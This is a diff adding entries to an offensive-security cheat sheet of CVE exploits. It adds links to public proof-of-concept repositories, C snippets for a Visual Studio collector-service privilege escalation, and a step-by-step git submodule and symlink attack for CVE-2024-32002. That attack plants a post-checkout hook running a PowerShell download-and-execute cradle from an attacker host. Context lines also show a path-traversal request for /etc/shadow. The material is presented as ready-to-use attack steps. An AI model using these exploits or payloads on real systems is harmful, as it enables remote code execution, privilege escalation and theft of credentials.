@@ -34,10 +34,12 @@
 - [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
 - [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
 - [CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE](#cve-2024-4577-php-cgi-argument-injection-vulnerability-rce)
+- [CVE-2024-20656: Visual Studio VSStandardCollectorService150 Service LPE](#cve-2024-20656-visual-studio-vsstandardcollectorservice150-service-lpe)
 - [CVE-2024-21378: Microsoft Outlook RCE](#cve-2024-21378-microsoft-outlook-rce)
 - [CVE-2024-21626: Leaky Vessels Container Escape](#cve-2024-21626-leaky-vessels-container-escape)
 - [CVE-2024-23897: Jenkins Arbitrary File Read](#cve-2024-23897-jenkins-arbitrary-file-read)
 - [CVE-2024-24919: Check Point Security Gateway Information Disclosure (0-day)](#cve-2024-24919-check-point-security-gateway-information-disclosure-0-day)
+- [CVE-2024-32002: Git: git clone RCE](#cve-2024-32002-git-git-clone-rce)
 - [GodPotato LPE](#godpotato-lpe)
 - [Juicy Potato LPE](#juicy-potato-lpe)
 - [JuicyPotatoNG LPE](#juicypotatong-lpe)
@@ -161,6 +163,7 @@
 | CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
 | CVE-2024-4577 | PHP-CGI Argument Injection Vulnerability RCE | https://github.com/watchtowrlabs/CVE-2024-4577 |
 | CVE-2024-6387 | OpenSSH regreSSHion RCE | https://github.com/zgzhang/cve-2024-6387-poc |
+| CVE-2024-20656 | Visual Studio VSStandardCollectorService150 Service LPE | https://github.com/Wh04m1001/CVE-2024-20656 |
 | CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (1) | https://github.com/duy-31/CVE-2024-21413 |
 | CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (2) | https://github.com/CMNatic/CVE-2024-21413 |
 | CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (3) | https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability |
@@ -169,6 +172,7 @@
 | CVE-2024-28897 | Jenkins Arbitrary File Read | https://github.com/CKevens/CVE-2024-23897 |
 | CVE-2024-29849 | Veeam Backup Enterprise Manager Authentication Bypass | https://github.com/sinsinology/CVE-2024-29849 |
 | CVE-2024-30088 | Microsoft Windows LPE | https://github.com/tykawaii98/CVE-2024-30088 |
+| CVE-2024-32002 | Git: git clone RCE | https://github.com/amalmurali47/git_rce |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | GSM Linux Kernel LPE (1) | https://github.com/jmpe4x/GSM_Linux_Kernel_LPE_Nday_Exploit |
@@ -1426,6 +1430,43 @@ else:
     print('(!) Exploit may have failed')
 ```
 
+## CVE-2024-20656: Visual Studio VSStandardCollectorService150 Service LPE
+
+> https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/
+
+> https://github.com/Wh04m1001/CVE-2024-20656
+
+### Vulnerability Verification
+
+```c
+PS C:\> sc qc VSStandardCollectorService150
+```
+
+### Potential Changes
+
+```c
+WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";
+```
+
+```c
+void cb1()
+{
+    printf("[*] Oplock!\n");
+    while (!Move(hFile2)) {}
+    printf("[+] File moved!\n");
+    bool result = CopyFile(L"C:\\Windows\\Tasks\\<FILE>.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
+    if (result)
+    {
+        printf("[+] File copied!\n");
+    }
+    else
+    {
+        printf("[-] Cannot copy file!\n");
+    }
+    finished = TRUE;
+}
+```
+
 ## CVE-2024-21378: Microsoft Outlook RCE
 
 > https://twitter.com/ptswarm/status/1778421129193136338
@@ -1724,6 +1765,50 @@ Content-Length: 39
 
 aCSHELL/../../../../../../../etc/shadow
 ```
+
+## CVE-2024-32002: Git: git clone RCE
+
+> https://amalmurali.me/posts/git-rce/
+
+> https://github.com/amalmurali47/git_rce
+
+### Hook Repository
+
+```c
+$ git clone http://<RHOST>:3000/<USERNAME>/hook.git
+$ cd hook
+$ mkdir -p y/hooks
+```
+
+```c
+$ cat > y/hooks/post-checkout <<EOF
+#!/bin/bash
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')"
+EOF
+```
+
+```c
+$ chmod +x y/hooks/post-checkout
+$ git add y/hooks/post-checkout
+$ git commit -m "post-checkout"
+$ git push
+```
+
+### RCE Repository
+
+```c
+$ git clone http://<RHOST>:3000/<USERNAME>/git_rce.git
+$ git submodule add --name x/y http://<RHOST>:3000/<USERNAME>/hook.git A/modules/x
+$ git commit -m "Add submodule"
+$ printf .git > dotgit.txt
+$ git hash-object -w --stdin < dotgit.txt > dot-git.hash
+$ printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
+$ git update-index --index-info < index.info
+$ git commit -m "Add symlink"
+$ git push
+```
+
+Compile the project for `Remote Code Execution (RCE)`.
 
 ## GodPotato LPE
 
